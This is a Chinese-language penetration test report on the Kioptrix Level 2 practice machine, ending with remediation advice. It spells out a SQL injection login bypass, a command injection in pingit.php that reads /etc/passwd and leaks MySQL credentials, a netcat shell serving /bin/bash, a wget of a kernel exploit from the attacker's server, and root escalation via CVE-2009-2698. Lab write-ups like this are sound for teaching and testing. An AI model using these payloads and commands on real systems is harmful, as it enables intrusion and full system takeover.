# Kioptrix Level 2 渗透测试报告

## 环境信息
| 项目 | 详情 |
|------|------|
| 靶机IP | 192.168.153.138 |
| 操作系统 | Linux kioptrix.level2 (CentOS 4.5) |
| 内核版本 | 2.6.9-55.EL |
| 架构 | i686 |
| 目标 | 获取 root 权限 |

---

## 渗透过程

### 1. 信息收集

**端口扫描**
```
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
443/tcp  open  https
631/tcp  open  ipp
784/tcp  open  unknown
```

**Web服务发现**
- Apache/2.0.52 (CentOS)
- PHP/4.3.9
- 发现登录页面: `http://192.168.153.138/index.php`

---

### 2. SQL注入漏洞

**漏洞位置**: 登录表单 `/index.php`

**Payload**:
```
用户名: ' or '1'='1' #
密码: 任意
```

**原理**: 
原始SQL查询:
```sql
SELECT * FROM users WHERE username = '$username' AND password='$password'
```
注入后变成:
```sql
SELECT * FROM users WHERE username = '' or '1'='1' # AND password='xxx'
```
`'1'='1'` 永远为真，绕过后台验证。

---

### 3. 命令注入漏洞

**漏洞位置**: ping功能 `/pingit.php`

登录后进入管理后台，发现ping功能存在命令注入漏洞。

**漏洞代码** (`pingit.php`):
```php
$target = $_REQUEST['ip'];
echo shell_exec('ping -c 3 ' . $target);
```

**验证命令注入**:
```
; cat /etc/passwd
```

成功执行，显示系统用户信息。

---

### 4. 数据库信息泄露

通过命令注入读取数据库配置，发现 MySQL 凭证：
```php
mysql_connect("localhost", "john", "hiroshima")
```

**数据库内容**:
| id | username | password |
|----|----------|----------|
| 1 | admin | 5afac8d85f |
| 2 | john | 66lajGGbla |

---

### 5. 反弹Shell获取

**查找 nc 路径**:
```
127.0.0.1 && find / -name nc
```

**靶机监听** (正向连接):
```
nc -lvnp 4444 -e /bin/bash
```

**攻击机连接**:
```
nc -vv 192.168.153.138 4444
```

**获取交互式Shell**:
```python
python -c "import pty; pty.spawn('/bin/bash')"
```

---

### 6. 权限提升

#### 6.1 确定目标系统版本

通过反弹Shell执行：
```bash
cat /proc/sys/kernel/osrelease
```
输出：`2.6.9-55.EL`

#### 6.2 Exploit选择

在攻击机(Kali)搜索对应漏洞：
```bash
searchsploit "2.6.9-55"
searchsploit "CentOS 4.5"
searchsploit "2.6.9" | grep -i centos
```

**匹配结果**:

| Exploit-DB ID | CVE | 影响范围 |
|----------------|------|----------|
| 9542 | CVE-2009-2698 | Linux 2.6 < 2.6.19 (32bit) |
| 9545 | CVE-2009-2692 | CentOS 4.8/5.3 / RHEL 4.8/5.3 |

**选择依据**:
- 靶机内核 `2.6.9-55.EL` 满足 `2.6 < 2.6.19` 条件
- CentOS 4.5 明确在测试通过列表中
- 32位系统(i686)符合exploit要求
- CVE-2009-2698 (ip_append_data漏洞) 针对该配置稳定可靠

#### 6.3 获取并上传Exploit

**攻击机下载Exploit**:
```bash
searchsploit -m linux/local/9542.c
```

**攻击机开启HTTP服务**:
```bash
python3 -m http.server 9090
```

**靶机下载Exploit**:
```bash
wget http://攻击机IP:9090/9542.c -O /tmp/9542.c
```

#### 6.4 编译并执行

```bash
gcc /tmp/9542.c -o /tmp/exploit
/tmp/exploit
```

**提权成功**:
```
uid=0(root) gid=0(root) groups=48(apache)
sh-3.00#
```

---

## 漏洞总结

| 漏洞类型 | 严重程度 | 状态 |
|----------|----------|------|
| SQL注入 (登录绕过) | 高 | 已利用 |
| 命令注入 (RCE) | 高 | 已利用 |
| MySQL凭证泄露 | 中 | 已利用 |
| 内核漏洞 (CVE-2009-2698) | 严重 | 已利用 |

---

## 利用链

```
Web登录 → SQL注入绕过 → 命令注入 → 反弹Shell → 内核漏洞提权 → Root权限
```

---

## 修复建议

1. **SQL注入**: 使用参数化查询或预编译语句
2. **命令注入**: 避免将用户输入直接传递给shell命令
3. **内核漏洞**: 升级到最新内核版本
4. **MySQL凭证**: 避免在代码中硬编码数据库密码